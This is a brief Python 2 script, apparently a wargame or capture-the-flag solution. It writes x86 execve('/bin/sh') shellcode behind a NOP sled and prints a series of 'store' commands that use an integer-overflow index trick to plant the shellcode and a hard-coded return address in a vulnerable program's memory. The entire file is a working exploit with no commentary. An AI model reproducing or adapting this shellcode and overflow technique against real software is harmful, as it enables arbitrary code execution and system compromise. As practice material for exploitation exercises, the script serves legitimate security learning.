import struct

def int_overflow(num):
    return num + 2**30 if num % 3 == 0 else num

SHELLCODE = b"\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x6A\x0B\x58\x89\xE3\x31\xC9\x31\xD2\xCD\x80"
SHELLCODE = "\x90" * (400 - len(SHELLCODE)) + SHELLCODE
SHELLCODE_ADDR = 0xffffd5a0

exploit = ""
exploit += "store\n"
exploit += str(SHELLCODE_ADDR) + "\n"
exploit += str(int_overflow(114)) + "\n"

store_index = 0

for i in xrange(0, len(SHELLCODE), 4):
    exploit += "store\n"
    exploit += str(struct.unpack("I", SHELLCODE[i:i+4])[0]) + "\n"
    exploit += str(int_overflow(store_index)) + "\n"
    store_index += 1

exploit += "quit\n"

print exploit